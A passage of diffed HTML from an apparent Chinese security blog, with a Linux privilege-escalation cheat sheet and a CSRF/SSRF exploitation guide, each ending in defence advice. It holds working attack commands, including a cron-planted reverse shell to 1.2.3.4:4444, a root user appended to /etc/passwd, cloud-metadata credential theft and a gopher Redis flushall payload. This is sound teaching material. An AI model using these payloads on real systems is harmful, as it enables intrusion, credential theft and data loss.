+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 17:29:32" itemprop="dateModified" datetime="2026-09-01T17:29:32+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">后渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>747</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>拿到低权限 shell 后，提权是后渗透阶段的核心任务。本文梳理 Linux 提权的常见思路与命令速查。仅用于授权环境。</p>
+<h2 id="0x01-基本信息收集"><a href="#0x01-基本信息收集" class="headerlink" title="0x01 基本信息收集"></a>0x01 基本信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>                      <span class="comment"># 当前用户与组</span></span><br><span class="line"><span class="built_in">whoami</span> &amp;&amp; hostname</span><br><span class="line"><span class="built_in">uname</span> -a                <span class="comment"># 内核版本</span></span><br><span class="line"><span class="built_in">cat</span> /etc/os-release     <span class="comment"># 发行版信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd         <span class="comment"># 用户列表</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*release       <span class="comment"># 系统标识</span></span><br><span class="line"><span class="built_in">sudo</span> -l                 <span class="comment"># 当前用户可执行的 sudo 命令</span></span><br><span class="line"><span class="built_in">env</span>                     <span class="comment"># 环境变量，留意 LD_PRELOAD 等</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-内核漏洞提权"><a href="#0x02-内核漏洞提权" class="headerlink" title="0x02 内核漏洞提权"></a>0x02 内核漏洞提权</h2><p><code>uname -a</code> 拿到内核版本后查 CVE：</p>
+<ul>
+<li><strong>DirtyCow</strong> (CVE-2016-5195)：Linux 2.6.22 ~ 4.8.3</li>
+<li><strong>DirtyPipe</strong> (CVE-2022-0847)：Linux 5.8 ~ 5.16.10</li>
+<li><strong>Dirty Cred</strong>：5.8+</li>
+<li><strong>OverlayFS</strong> (CVE-2023-0386)</li>
+</ul>
+<p>辅助工具：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/sleventyeleap/linuxprivchecker">linuxprivchecker</a></li>
+</ul>
+<h2 id="0x03-SUID-提权"><a href="#0x03-SUID-提权" class="headerlink" title="0x03 SUID 提权"></a>0x03 SUID 提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>经典利用（参考 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap</span></span><br><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># find</span></span><br><span class="line">find . -<span class="built_in">exec</span> /bin/sh \; -quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># python / perl / ruby</span></span><br><span class="line">python -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line">perl -e <span class="string">&#x27;exec &quot;/bin/sh&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cp: 拷贝并替换 /etc/passwd</span></span><br><span class="line">openssl passwd -1 -salt xyz password123</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;r00t:$1$xyz$xxx...:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-Sudo-配置错误"><a href="#0x04-Sudo-配置错误" class="headerlink" title="0x04 Sudo 配置错误"></a>0x04 Sudo 配置错误</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"><span class="comment"># (ALL) NOPASSWD: /usr/bin/vim</span></span><br><span class="line"><span class="comment"># (ALL) NOPASSWD: /usr/bin/find</span></span><br></pre></td></tr></table></figure>
+
+<p>凡是发现 <code>sudo</code> 可执行的命令，先去 GTFOBins 查一下能否 escape shell。</p>
+<p>经典：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim -c <span class="string">&#x27;:!sh&#x27;</span></span><br><span class="line"><span class="built_in">sudo</span> less /etc/shadow  <span class="comment"># 然后 !sh</span></span><br><span class="line"><span class="built_in">sudo</span> awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">env</span> /bin/sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-计划任务-Cron"><a href="#0x05-计划任务-Cron" class="headerlink" title="0x05 计划任务 Cron"></a>0x05 计划任务 Cron</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line"><span class="built_in">ls</span> -la /etc/cron.*</span><br><span class="line"><span class="built_in">cat</span> /var/spool/cron/*</span><br><span class="line"><span class="comment"># 找以 root 运行 + 当前用户可写的脚本</span></span><br><span class="line">find / -writable 2&gt;/dev/null | grep -E <span class="string">&#x27;(\.sh|cron)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>写入反弹 shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/1.2.3.4/4444 0&gt;&amp;1&quot;&#x27;</span> &gt;&gt; /opt/scripts/backup.sh</span><br><span class="line"><span class="built_in">chmod</span> +x /opt/scripts/backup.sh</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-PATH-劫持"><a href="#0x06-PATH-劫持" class="headerlink" title="0x06 PATH 劫持"></a>0x06 PATH 劫持</h2><p>如果某个 SUID 程序调用了不指定绝对路径的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 靶机: SUID 程序调用了 ps</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/sh&#x27;</span> &gt; ps</span><br><span class="line"><span class="built_in">chmod</span> +x ps</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line">/path/to/suid_binary</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-Capabilities-提权"><a href="#0x07-Capabilities-提权" class="headerlink" title="0x07 Capabilities 提权"></a>0x07 Capabilities 提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line"><span class="comment"># /usr/bin/python3 = cap_setuid+ep</span></span><br><span class="line">/usr/bin/python3 -c <span class="string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-NFS-提权"><a href="#0x08-NFS-提权" class="headerlink" title="0x08 NFS 提权"></a>0x08 NFS 提权</h2><p>如果靶机 export 出 <code>no_root_squash</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机</span></span><br><span class="line">showmount -e target</span><br><span class="line"><span class="built_in">mkdir</span> /tmp/mnt</span><br><span class="line">mount -t nfs target:/home/user /tmp/mnt</span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/mnt/.bash</span><br><span class="line"><span class="built_in">chmod</span> u+s /tmp/mnt/.bash</span><br><span class="line">umount /tmp/mnt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 靶机上以 user 执行</span></span><br><span class="line">/home/user/.bash -p</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-配置文件密钥泄露"><a href="#0x09-配置文件密钥泄露" class="headerlink" title="0x09 配置文件密钥泄露"></a>0x09 配置文件密钥泄露</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;*.pem&quot;</span> -o -name <span class="string">&quot;*.key&quot;</span> 2&gt;/dev/null</span><br><span class="line">find / -name <span class="string">&quot;id_rsa&quot;</span> 2&gt;/dev/null</span><br><span class="line"><span class="built_in">cat</span> ~/.bash_history | grep -iE <span class="string">&quot;ssh|pass|mysql&quot;</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/config</span><br><span class="line"><span class="built_in">cat</span> /var/log/auth.log | grep -i pass</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x10-自动化枚举工具"><a href="#0x10-自动化枚举工具" class="headerlink" title="0x10 自动化枚举工具"></a>0x10 自动化枚举工具</h2><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LinPEAS</td>
+<td>最全，输出彩色</td>
+</tr>
+<tr>
+<td>LinEnum</td>
+<td>经典，老牌</td>
+</tr>
+<tr>
+<td>linuxprivchecker</td>
+<td>Python 写的，简单</td>
+</tr>
+<tr>
+<td>sucp</td>
+<td>自动找 sudo 路径</td>
+</tr>
+<tr>
+<td>pspy</td>
+<td>监控运行中的 root 进程</td>
+</tr>
+</tbody></table>
+<h2 id="0x11-防御侧建议"><a href="#0x11-防御侧建议" class="headerlink" title="0x11 防御侧建议"></a>0x11 防御侧建议</h2><ul>
+<li>内核及时打补丁</li>
+<li>最小化 SUID 列表（<code>chmod -s</code> 不必要的）</li>
+<li><code>sudo</code> 配置遵循最小权限</li>
+<li>用户家目录严格隔离</li>
+<li>计划任务脚本加权限控制</li>
+<li>启用 auditd 监控权限异常</li>
+</ul>
+<h2 id="0x12-总结"><a href="#0x12-总结" class="headerlink" title="0x12 总结"></a>0x12 总结</h2><p>提权本质是「找配置错误 &#x2F; 找版本漏洞」。一份 <code>LinPEAS</code> + 一份 <code>GTFOBins</code> 走天下，但理解原理才能不依赖工具。</p>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文所有技术内容仅用于<strong>合法授权</strong>的安全研究。任何将本文技术用于非法用途的行为，使用者自行承担一切后果。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lvyatan.github.io/2026/08/08/CSRF%E4%B8%8ESSRF%E5%8C%BA%E5%88%AB%E4%B8%8E%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/lvyatan">
+      <meta itemprop="name" content="lvyatan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网安学习笔记">
+      <meta itemprop="description" content="个人网络安全学习博客，记录渗透测试、漏洞挖掘、安全工具开发等技术笔记">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | 网安学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/08/08/CSRF%E4%B8%8ESSRF%E5%8C%BA%E5%88%AB%E4%B8%8E%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">CSRF 与 SSRF 区别与利用</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-08 17:20:00" itemprop="dateCreated datePublished" datetime="2026-08-08T17:20:00+08:00">2026-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-09-01 18:08:13" itemprop="dateModified" datetime="2026-09-01T18:08:13+08:00">2026-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web-%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">Web 渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CSRF 和 SSRF 只差一个字母，本质却完全不同。本文对比两者原理、利用面与防御，作为速查。</p>
+<blockquote>
+<p>仅用于合法授权环境的安全研究。</p>
+</blockquote>
+<h2 id="0x01-本质对比"><a href="#0x01-本质对比" class="headerlink" title="0x01 本质对比"></a>0x01 本质对比</h2><table>
+<thead>
+<tr>
+<th></th>
+<th>CSRF</th>
+<th>SSRF</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>全称</td>
+<td>Cross-Site Request Forgery</td>
+<td>Server-Side Request Forgery</td>
+</tr>
+<tr>
+<td>受害者</td>
+<td>用户浏览器</td>
+<td>应用服务器</td>
+</tr>
+<tr>
+<td>关键条件</td>
+<td>用户已登录目标站</td>
+<td>服务端发起外部请求</td>
+</tr>
+<tr>
+<td>利用方向</td>
+<td>用户冒充</td>
+<td>服务端冒充</td>
+</tr>
+<tr>
+<td>攻击面</td>
+<td>改密码、转账、删帖</td>
+<td>内网穿透、读元数据、攻击内网服务</td>
+</tr>
+</tbody></table>
+<h2 id="0x02-CSRF-原理与利用"><a href="#0x02-CSRF-原理与利用" class="headerlink" title="0x02 CSRF 原理与利用"></a>0x02 CSRF 原理与利用</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>用户登录站点 A 后访问恶意页面 B，B 中包含对 A 的请求。浏览器自动带 A 的 Cookie，A 把这当成合法请求执行。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 攻击者放在自己站点的恶意页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://bank.com/transfer?to=attacker&amp;amount=10000&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用户打开后浏览器尝试加载图片 → 触发转账请求 → 带 Cookie 完成。</p>
+<h3 id="利用-1：GET-型"><a href="#利用-1：GET-型" class="headerlink" title="利用 1：GET 型"></a>利用 1：GET 型</h3><p>构造诱导链接即可，无需 JS：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://target.com/delete?id=1&quot;</span>&gt;</span>点我看图<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-2：POST-型"><a href="#利用-2：POST-型" class="headerlink" title="利用 2：POST 型"></a>利用 2：POST 型</h3><p>构造自动提交表单：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;f&quot;</span> <span class="attr">action</span>=<span class="string">&quot;https://target.com/email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;attacker@x.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;f&#x27;</span>).<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>或用 fetch + credentials：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://target.com/api/admin&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&#x27;role=admin&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-3：JSON-接口-CSRF"><a href="#利用-3：JSON-接口-CSRF" class="headerlink" title="利用 3：JSON 接口 CSRF"></a>利用 3：JSON 接口 CSRF</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://target.com/api/profile&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;text/plain&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;&#123;&quot;role&quot;:&quot;admin&quot;,&quot;padding&quot;:&quot;&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;&quot;&#125;&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>巧用 enctype 绕过 Content-Type 检查。</p>
+<h3 id="CSRF-的限制"><a href="#CSRF-的限制" class="headerlink" title="CSRF 的限制"></a>CSRF 的限制</h3><ul>
+<li>必须有有效 Session</li>
+<li>不能读取响应（同源策略）</li>
+<li>只能做”用户能做的事”</li>
+</ul>
+<h2 id="0x03-SSRF-原理与利用"><a href="#0x03-SSRF-原理与利用" class="headerlink" title="0x03 SSRF 原理与利用"></a>0x03 SSRF 原理与利用</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>服务端接收用户输入的 URL，主动发起请求。攻击者控制该 URL，让服务器访问任意地址。</p>
+<p>典型漏洞：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-1：内网穿透"><a href="#利用-1：内网穿透" class="headerlink" title="利用 1：内网穿透"></a>利用 1：内网穿透</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://target.com/proxy?url=http://127.0.0.1:80/</span><br><span class="line">https://target.com/proxy?url=http://192.168.1.1/admin</span><br></pre></td></tr></table></figure>
+
+<p>把内网服务暴露出来。常用端口扫描：22, 80, 443, 3306, 6379, 8080, 9200。</p>
+<h3 id="利用-2：读取元数据（云）"><a href="#利用-2：读取元数据（云）" class="headerlink" title="利用 2：读取元数据（云）"></a>利用 2：读取元数据（云）</h3><p>AWS &#x2F; GCP &#x2F; Azure &#x2F; 阿里云都暴露 metadata 端点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.169.254/latest/meta-data/</span><br><span class="line">http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name</span><br></pre></td></tr></table></figure>
+
+<p>拿到 AK&#x2F;SK 后直接接管云账号。</p>
+<h3 id="利用-3：协议利用"><a href="#利用-3：协议利用" class="headerlink" title="利用 3：协议利用"></a>利用 3：协议利用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># file 协议读本地文件</span><br><span class="line">url=file:///etc/passwd</span><br><span class="line">url=file:///C:/Windows/win.ini</span><br><span class="line"></span><br><span class="line"># gopher 协议打 Redis / MySQL / FastCGI</span><br><span class="line">url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...</span><br><span class="line"></span><br><span class="line"># dict 协议探测</span><br><span class="line">url=dict://127.0.0.1:6379/INFO</span><br><span class="line"></span><br><span class="line"># ldap / netdoc 等</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-4：盲-SSRF-探测"><a href="#利用-4：盲-SSRF-探测" class="headerlink" title="利用 4：盲 SSRF 探测"></a>利用 4：盲 SSRF 探测</h3><p>不能回显时用时间差判断：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1:6379    # Redis 存活 1s 内响应</span><br><span class="line">url=http://127.0.0.1:3306    # MySQL 立即拒绝</span><br><span class="line">url=http://127.0.0.1:81      # 关闭端口超时</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-5：DNS-Rebinding-绕过白名单"><a href="#利用-5：DNS-Rebinding-绕过白名单" class="headerlink" title="利用 5：DNS Rebinding 绕过白名单"></a>利用 5：DNS Rebinding 绕过白名单</h3><p>服务端校验 IP 不在内网，但解析两次：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外部 DNS 第一次返回 attacker IP（白名单过校验）</span><br><span class="line">第二次返回 127.0.0.1（实际请求发到本机）</span><br></pre></td></tr></table></figure>
+
+<p>防护时需用 socket 解析一次后直连，避免重复 DNS。</p>
+<h2 id="0x04-SSRF-绕过技巧"><a href="#0x04-SSRF-绕过技巧" class="headerlink" title="0x04 SSRF 绕过技巧"></a>0x04 SSRF 绕过技巧</h2><p>服务端黑名单 <code>127.0.0.1</code>、<code>localhost</code>、<code>192.</code>、<code>10.</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 等价 IP</span><br><span class="line">http://0x7f.0.0.1/           # 十六进制</span><br><span class="line">http://2130706433/           # 十进制</span><br><span class="line">http://017700000001/         # 八进制</span><br><span class="line">http://[::1]/                # IPv6 本地</span><br><span class="line">http://[0:0:0:0:0:0:0:1]/</span><br><span class="line"></span><br><span class="line"># DNS 解析到 127.0.0.1</span><br><span class="line">http://localtest.me          # 解析 127.0.0.1</span><br><span class="line">http://customer1.app.localhost.com</span><br><span class="line"></span><br><span class="line"># 短链跳转</span><br><span class="line">http://t.cn/xxxxx  → 跳转到 127.0.0.1</span><br><span class="line"></span><br><span class="line"># 子域名指向内网</span><br><span class="line">http://internal.attacker.com  → 解析到 192.168.1.5</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h2><h3 id="1-CSRF-防御"><a href="#1-CSRF-防御" class="headerlink" title="1. CSRF 防御"></a>1. CSRF 防御</h3><ul>
+<li><strong>CSRF Token</strong>：表单&#x2F;接口加不可预测 token，服务端校验</li>
+<li><strong>SameSite Cookie</strong>：<code>SameSite=Strict</code> 或 <code>SameSite=Lax</code></li>
+<li><strong>双重 Cookie</strong>：自定义 Header + Cookie 携带同一 token</li>
+<li><strong>Referer 校验</strong>（弱，可绕过）</li>
+<li>敏感操作二次验证（验证码、密码）</li>
+</ul>
+<h3 id="2-SSRF-防御"><a href="#2-SSRF-防御" class="headerlink" title="2. SSRF 防御"></a>2. SSRF 防御</h3><ul>
+<li><strong>白名单域名</strong>：只允许请求指定外部域名</li>
+<li><strong>IP 校验</strong>：禁止访问 127&#x2F;8、10&#x2F;8、172.16&#x2F;12、192.168&#x2F;16、169.254&#x2F;16、::1</li>
+<li><strong>协议白名单</strong>：只允许 http&#x2F;https</li>
+<li><strong>解析后直连</strong>：一次 DNS 解析，禁用重定向</li>
+<li><strong>关闭云元数据端点访问</strong>：云厂商建议绑定防火墙</li>
+<li><strong>出口网关</strong>：业务服务器不出网，只能经代理</li>
+<li><strong>禁用危险协议</strong>：file、gopher、dict、netdoc</li>
+</ul>
+<h2 id="0x06-工具推荐"><a href="#0x06-工具推荐" class="headerlink" title="0x06 工具推荐"></a>0x06 工具推荐</h2><ul>
+<li><strong>Gopherus</strong>：生成 gopher 协议 payload</li>
+<li><strong>SSRFmap</strong>：自动化 SSRF 利用</li>
+<li><strong>cloudevader</strong>：云元数据探测</li>
+<li><strong>Burp Collaborator &#x2F; interactsh</strong>：盲 SSRF 回连</li>
+</ul>
